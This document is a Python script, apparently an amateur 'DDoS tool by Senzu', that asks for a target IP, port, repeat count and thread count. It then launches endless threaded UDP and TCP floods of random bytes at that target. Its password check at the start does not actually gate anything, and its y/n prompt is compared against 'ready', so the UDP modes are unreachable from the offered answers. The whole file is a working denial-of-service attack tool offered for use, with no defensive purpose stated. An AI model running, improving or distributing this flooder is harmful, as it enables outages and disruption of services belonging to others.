#Excuted
#Senzu
import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="Piya102"

for i in range(3):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] WRONG PASSWORD!!! ")
		continue
time.sleep(5)
print("[•] Your Account Has Been Accepted! \033[92m[√]\033[0m ")
time.sleep(5)
os.system("clear")

print("\033[92m 


██████╗░██╗██╗░░░██╗░█████╗░
██╔══██╗██║╚██╗░██╔╝██╔══██╗
██████╔╝██║░╚████╔╝░███████║
██╔═══╝░██║░░╚██╔╝░░██╔══██║
██║░░░░░██║░░░██║░░░██║░░██║
╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝ ") 
        
   
print("\033[92m========= Tools By Senzu =========") 
print("\033[92m>> Author : Senzu") 
print("\033[92m>>> Coded : Senzu") 
ip = str(input("Ip : "))
port = int(input("Port : "))
choice = str(input("Gass?? (y/n) : "))
times = int(input("Times : "))
threads = int(input("Threads : "))
os.system("clear")
def ddos():
	data = random._urandom(1081)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m Senzu X Piya ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[*] Senzu X Piya ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos2():
	data = random._urandom(1066)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Senzu X Piya ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Senzu X Piya ATTACK IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos3():
	data = random._urandom(66)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m Senzu X Piya ATTACK TO\033[92m >>> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m [#] Senzu X Piya ATTACK IP\033[92m >>> {}:{} \u001b[31m".format(ip, port))


for y in range(threads):
	if choice == 'ready':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
